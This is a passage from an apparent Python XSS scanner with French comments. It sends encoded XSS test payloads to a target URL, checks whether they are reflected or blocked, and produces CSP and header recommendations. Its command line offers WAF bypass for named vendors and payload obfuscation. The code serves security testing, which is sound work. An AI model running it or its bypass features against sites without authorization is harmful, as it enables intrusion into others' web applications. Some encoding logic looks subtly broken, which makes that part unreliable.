                {"name": "Firefox", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"},
                {"name": "Safari", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"},
                {"name": "Edge", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"},
                {"name": "IE11", "ua": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"}
            ]
            
            # Payload de base pour tester les navigateurs
            test_payload = "<img src=x onerror=console.log(1)>"
            
            for browser in browser_tests:
                try:
                    custom_headers = {'User-Agent': browser['ua']}
                    
                    # Tester avec différents encodages
                    encodings = [
                        {"name": "UTF-7", "payload": test_payload.encode('utf-7').decode()},
                        {"name": "UTF-16", "payload": test_payload.encode('utf-16').decode('utf-16')},
                        {"name": "Base64", "payload": f"<script>eval(atob('{test_payload.encode('ascii').decode('ascii')}'))</script>"}
                    ]
                    
                    for encoding in encodings:
                        # Cette requête est uniquement pour tester le comportement du navigateur
                        # Nous ne pouvons pas réellement savoir comment chaque navigateur se comporte
                        # sans l'exécuter, mais nous pouvons détecter certains comportements serveur
                        response = self.http.get(f"{self.target}?test={encoding['payload']}", 
                                                headers=custom_headers)
                        
                        if response.status_code == 403:
                            results['browser_detection'].append({
                                'browser': browser['name'],
                                'encoding': encoding['name'],
                                'blocked': True,
                                'status': response.status_code
                            })
                            logger.info(f"Navigateur {browser['name']} avec encodage {encoding['name']} - Bloqué (403)")
                        else:
                            results['browser_detection'].append({
                                'browser': browser['name'],
                                'encoding': encoding['name'],
                                'blocked': False,
                                'status': response.status_code
                            })
                            logger.info(f"Navigateur {browser['name']} avec encodage {encoding['name']} - Non bloqué ({response.status_code})")
                except Exception as e:
                    logger.error(f"Erreur lors du test avec {browser['name']}: {e}")
            
            # Test d'exploitation XSS Auditor
            try:
                if results['xss_protection_header'] in ['0', 'non présent']:
                    logger.info("Test d'exploitation de l'absence de XSS Auditor")
                    
                    # Tester une vulnérabilité DOM basique
                    dom_payload = "<script>document.write('<img src=x onerror=console.log(1)>')</script>"
                    response = self.http.get(f"{self.target}?test={dom_payload}")
                    
                    if dom_payload in response.text:
                        logger.warning("Le payload DOM est réfléchi dans la réponse sans être filtré")
                        results['xss_auditor'] = 'vulnérable'
                    else:
                        logger.info("Le payload DOM semble être filtré malgré l'absence de XSS Auditor")
                        results['xss_auditor'] = 'filtrage présent'
            except Exception as e:
                logger.error(f"Erreur lors du test d'exploitation XSS Auditor: {e}")
            
        except Exception as e:
            logger.error(f"Erreur lors des tests de sécurité des navigateurs: {e}")
        
        return results

    def generate_mitigation_recommendations(self):
        """
        Génère des recommandations de mitigation basées sur les vulnérabilités trouvées
        
        Returns:
            Liste des recommandations
        """
        recommendations = []
        
        # Tester les mécanismes de sécurité des navigateurs
        security_features = self._test_browser_security_features()
        
        # Recommandations basées sur les en-têtes HTTP
        if security_features['xss_protection_header'] in ['0', 'non présent']:
            recommendations.append({
                'type': 'header',
                'header': 'X-XSS-Protection',
                'value': '1; mode=block',
                'description': "Activer l'XSS Auditor des navigateurs pour bloquer les attaques XSS réfléchies",
                'priority': 'élevée'
            })
        
        if security_features['content_security_policy'] == 'non présent':
            recommendations.append({
                'type': 'header',
                'header': 'Content-Security-Policy',
                'value': "default-src 'self'; script-src 'self'; object-src 'none';",
                'description': "Implémenter une politique CSP restrictive pour limiter les sources de scripts et de ressources",
                'priority': 'élevée'
            })
        elif 'unsafe-inline' in security_features['content_security_policy'] or 'unsafe-eval' in security_features['content_security_policy']:
            recommendations.append({
                'type': 'header',
                'header': 'Content-Security-Policy',
                'value': "Renforcer la politique CSP en évitant unsafe-inline et unsafe-eval",
                'description': "La politique CSP actuelle utilise des directives potentiellement dangereuses",
                'priority': 'moyenne'
            })
        
        # Recommandations basées sur les vulnérabilités trouvées
        if self.vulnerabilities:
            # Compter les types de vulnérabilités
            vuln_types = {}
            for vuln in self.vulnerabilities:
                vuln_type = vuln.get('payload_type', 'basic')
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = 0
                vuln_types[vuln_type] += 1
            
            # Recommandations spécifiques basées sur les types de vulnérabilités
            if 'dom' in vuln_types:
                recommendations.append({
                    'type': 'code',
                    'category': 'dom',
                    'description': "Éviter l'utilisation de document.write, innerHTML, et autres API DOM potentiellement dangereuses",
                    'example': "Utiliser textContent ou innerText au lieu de innerHTML",
                    'priority': 'élevée'
                })
            
            if 'css' in vuln_types:
                recommendations.append({
                    'type': 'code',
                    'category': 'css',
                    'description': "Éviter l'utilisation d'URL dans les propriétés CSS",
                    'example': "Éviter background-image: url(...) avec des entrées utilisateur",
                    'priority': 'moyenne'
                })
            
            # Recommandations générales d'encodage
            recommendations.append({
                'type': 'code',
                'category': 'encodage',
                'description': "Encoder correctement les sorties HTML selon leur contexte",
                'example': "Utiliser htmlspecialchars() en PHP, escape() en JavaScript, ou les fonctions équivalentes",
                'priority': 'élevée'
            })
            
            # Recommandations de validation des entrées
            recommendations.append({
                'type': 'code',
                'category': 'validation',
                'description': "Valider toutes les entrées utilisateur côté serveur",
                'example': "Utiliser des expressions régulières et des listes blanches pour valider les paramètres",
                'priority': 'élevée'
            })
        
        return recommendations

def main():
    """
    Point d'entrée du programme
    """
    parser = argparse.ArgumentParser(description='Scanner de vulnérabilités XSS')
    parser.add_argument('url', help='URL à scanner')
    parser.add_argument('-o', '--output', help='Fichier de sortie pour le rapport')
    parser.add_argument('-c', '--cookies', help='Cookies à utiliser pour les requêtes')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Timeout pour les requêtes')
    parser.add_argument('-v', '--verbose', action='store_true', help='Mode verbeux')
    parser.add_argument('-r', '--recursive', action='store_true', help='Exploration récursive')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Profondeur d\'exploration')
    parser.add_argument('-w', '--waf', help='Type de WAF à contourner (cloudflare, akamai, modsecurity)')
    parser.add_argument('-b', '--bypass', action='store_true', help='Activer le mode bypass WAF')
    parser.add_argument('-O', '--obfuscation', type=int, choices=[0, 1, 2, 3], default=0, 
                       help='Niveau d\'obfuscation des payloads (0=aucun, 3=maximum)')
    parser.add_argument('-p', '--payload', help='Payload XSS personnalisé à utiliser')
    parser.add_argument('-H', '--headers', help='En-têtes HTTP personnalisés (format: "Nom1: Valeur1; Nom2: Valeur2")')
    parser.add_argument('-P', '--proxy', help='Utiliser un proxy (format: http://proxy:port)')
    
    args = parser.parse_args()
    
    # Configuration du niveau de log
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Options pour le scanner
    options = {
        'recursive': args.recursive,
        'depth': args.depth,
        'timeout': args.timeout
    }
    
    # Configuration HTTP
    http_config = {}
    if args.cookies:
        http_config['cookies'] = args.cookies
    
    if args.headers:
        headers = {}
        for header_pair in args.headers.split(';'):
            if ':' in header_pair:
                name, value = header_pair.split(':', 1)
                headers[name.strip()] = value.strip()
        http_config['headers'] = headers
    
    if args.proxy:
        http_config['proxies'] = {
            'http': args.proxy,
            'https': args.proxy
        }
    
    # Création du scanner
    scanner = XSSScanner(args.url, options, http_config)
    
    # Génération de payloads personnalisés si nécessaire
    if args.payload or args.bypass or args.obfuscation > 0:
        custom_payloads = scanner.generate_custom_payloads(
            base_payload=args.payload, 
            waf_type=args.waf if args.bypass else None,
            obfuscation_level=args.obfuscation
        )
        
        if custom_payloads:
            # Ajout des payloads personnalisés
            scanner.payloads['custom'] = [p['payload'] for p in custom_payloads]
            
            # Ajouter 'custom' aux types de test
            if 'custom' not in scanner.test_types:
                scanner.test_types.append('custom')
            
            if args.verbose:
                print("\nPayloads personnalisés générés:")
                for i, p in enumerate(custom_payloads):
                    if 'description' in p:
                        print(f"{i+1}. {p['description']}: {p['payload']}")
                    else:
                        print(f"{i+1}. Payload: {p['payload']}")
                print()
    
    # Exécution du scan
    report = scanner.run(args.output)
    
    # Affichage des résultats
    print(f"\nRésumé du scan XSS:")
    print(f"URL cible: {args.url}")
    print(f"Points d'injection trouvés: {len(scanner.injection_points)}")
    print(f"Vulnérabilités détectées: {scanner.stats['vulnerabilities_found']}")
    print(f"Temps écoulé: {scanner.stats['time_elapsed']:.2f} secondes")
    
    if scanner.stats['vulnerabilities_found'] > 0:
        print("\nVulnérabilités trouvées:")
        for i, vuln in enumerate(scanner.vulnerabilities):
            payload = vuln['payload']
            if len(payload) > 50:
                payload = payload[:47] + "..."
            print(f"{i+1}. {vuln['url']} - {vuln.get('injection_point', 'N/A')} - {payload}")
    
    if args.output:
        print(f"\nRapport complet disponible dans: {args.output}")

if __name__ == "__main__":
    main()
